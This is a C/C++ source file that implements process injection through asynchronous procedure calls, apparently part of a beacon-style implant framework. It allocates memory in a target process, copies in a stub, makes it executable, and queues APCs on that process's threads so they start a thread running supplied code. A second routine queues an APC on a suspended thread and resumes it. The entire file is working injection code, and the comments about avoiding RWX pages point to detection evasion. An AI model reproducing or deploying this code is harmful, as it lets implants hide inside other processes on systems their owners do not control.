#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"
#include "syscalls.h"
#include <bcrypt.h>

typedef NTSTATUS(NTAPI * NTQUEUEAPCTHREAD)(HANDLE hThreadHandle, LPVOID lpApcRoutine, LPVOID lpApcRoutineContext, LPVOID lpApcStatusBlock, LPVOID lpApcReserved);

typedef struct {
	LPVOID  lpStartAddress;
	LPVOID  lpParameter;
	HANDLE  (__stdcall *pCreateThread)(LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD);
	BOOL    fired;
} APCCONTEXT;

typedef struct {
#if defined(_M_IX86)
	BYTE   empty[424]; // 0x1a8 = 424
#elif defined (_M_AMD64)
	BYTE   empty[712]; // 0x2c8 = 712
#endif
	LPVOID actctx;
} LAZYTEB;

static void _migrateit(APCCONTEXT * context) {
	LAZYTEB * teb;

	if (context->fired == FALSE) {
		/* make it so subsequent runs do nothing */
		context->fired = TRUE;

		/* read the TEB */
#if defined(_M_IX86)
		teb = (LAZYTEB *)__readfsdword(0x18);
#elif defined (_M_AMD64)
		teb = (LAZYTEB *)__readgsqword(FIELD_OFFSET(NT_TIB, Self));
#endif

		/* Check the ActivationContextStackPointer. If it's NULL, CreateThread will crash */
		if (teb->actctx == NULL) {
			context->fired = FALSE;
			return;
		}

		/* create a thread */
		context->pCreateThread(NULL, 0, context->lpStartAddress, context->lpParameter, 0, NULL);
	}
}

/* we push a stub over because we want to create a new thread to allow the original thread to function as normal */
static char * copycontext(HANDLE hProcess, DWORD pid, APCCONTEXT * context, char ** code_remote_out) {
	char * ctx_remote;
	char * code_remote;
	DWORD fnsize = (DWORD)((DWORD_PTR)copycontext - (DWORD_PTR)_migrateit);
	SIZE_T wrote  = 0;
	DWORD old    = 0;

	/* the APC context (data) and the stub (code) go into SEPARATE remote
	 * allocations: the context must stay writable (the fired flag flips
	 * remotely) while the code only needs to execute - a single combined
	 * RWX page is what this used to be. */
	ctx_remote = (char *)beacon_VirtualAllocEx(hProcess, NULL, sizeof(APCCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	code_remote = (char *)beacon_VirtualAllocEx(hProcess, NULL, fnsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (ctx_remote == NULL || code_remote == NULL) {
		if (ctx_remote != NULL)
			beacon_VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
		if (code_remote != NULL)
			beacon_VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
		*code_remote_out = NULL;
		return NULL;
	}

	/* write our process memory */
	if (!beacon_WriteProcessMemory(hProcess, ctx_remote, (char *)context, sizeof(APCCONTEXT), &wrote) || wrote != sizeof(APCCONTEXT)) {
		beacon_VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
		beacon_VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
		*code_remote_out = NULL;
		return NULL;
	}
	if (!beacon_WriteProcessMemory(hProcess, code_remote, (char *)_migrateit, fnsize, &wrote) || wrote != fnsize) {
		beacon_VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
		beacon_VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
		*code_remote_out = NULL;
		return NULL;
	}

	/* code is never modified remotely: drop it to RX before any APC runs */
	beacon_VirtualProtectEx(hProcess, code_remote, fnsize, PAGE_EXECUTE_READ, &old);

	*code_remote_out = code_remote;
	return ctx_remote;
}

BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
	NTQUEUEAPCTHREAD pNtQueueApcThread = NULL;
	HANDLE           hThreadSnap       = NULL;
	THREADENTRY32    t                 = { 0 };
	APCCONTEXT       ctx               = { 0 };
	HANDLE           hThread           = NULL;
	char *           remote_context    = NULL;
	char *           remote_code       = NULL;
	SIZE_T          x                  = 0;

	/* our result */
	BOOL             result            = FALSE;

	/* make sure we're aware of the right size, k. thx. */
	t.dwSize = sizeof(THREADENTRY32);

	/* setup our context... assumes we're injecting into a same arch process */
	ctx.lpStartAddress  = lpStartAddress;
	ctx.lpParameter     = lpParameter;
	ctx.pCreateThread   = reinterpret_cast<HANDLE(WINAPI*)(LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD)>(CreateThread);
	ctx.fired           = FALSE;

	pNtQueueApcThread  = (NTQUEUEAPCTHREAD)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThread");
	if (!pNtQueueApcThread)
		return FALSE;

	/* OK, we made it this far, let's mirror our context */
	remote_context     = copycontext(injctx->hProcess, injctx->pid, &ctx, &remote_code);
	if (remote_context == NULL)
		return FALSE;

	/* take a snapshot of some threads */
	hThreadSnap        = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (!hThreadSnap) {
		/* no APCs queued yet - the remote allocations are safe to release */
		beacon_VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
		beacon_VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
		return FALSE;
	}

	if (!Thread32First(hThreadSnap, &t)) {
		CloseHandle(hThreadSnap);
		beacon_VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
		beacon_VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
		return FALSE;
	}

	do {
		/* Only proceed if we are targeting a thread in the target process */
		if (t.th32OwnerProcessID != injctx->pid)
			continue;

		/* Open a handle to this thread so we can do the apc injection */
		hThread = beacon_OpenThread(THREAD_ALL_ACCESS, FALSE, t.th32ThreadID);
		if (!hThread)
			continue;

		/* queue our APC method: routine = the remote stub, context = the remote data */
		pNtQueueApcThread(hThread, remote_code, remote_context, 0, 0);

		/* close the handle */
		CloseHandle(hThread);
	} while (Thread32Next(hThreadSnap, &t));


	/* kill our thread snapshot too */
	if (hThreadSnap)
		CloseHandle(hThreadSnap);

	/* wait... */
	Sleep(200);

	/* read the APC context to determine if we succeeded or failed */
	if (!beacon_ReadProcessMemory(injctx->hProcess, remote_context, (char *)&ctx, sizeof(APCCONTEXT), &x) || x != sizeof(APCCONTEXT))
		return FALSE;

	/* if we did not fire, make it so we don't accidentally kick off later */
	if (ctx.fired == 0) {
		ctx.fired = 1; /* update so that future wake-ups don't try anything */
		beacon_WriteProcessMemory(injctx->hProcess, remote_context, (char *)&ctx, sizeof(APCCONTEXT), &x);
		return FALSE;
	}

	/* ctx.fired == 1, so we probably fired successfully */
	return TRUE;
}

BOOL inject_via_apcthread_targeted(INJECTCONTEXT * ictx, LPVOID lpStartAddress, LPVOID lpParameter) {
	NTQUEUEAPCTHREAD pNtQueueApcThread = NULL;

	/* resolve our function */
	pNtQueueApcThread = (NTQUEUEAPCTHREAD)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThread");
	if (!pNtQueueApcThread)
		return FALSE;

	/* add to the APC queue of the target thread */
	if (pNtQueueApcThread(ictx->hThread, lpStartAddress, lpParameter, 0, 0) != ERROR_SUCCESS)
		return FALSE;

	/* try to resume the thread... punt if it fails */
	return ResumeThread(ictx->hThread) != -1;
}


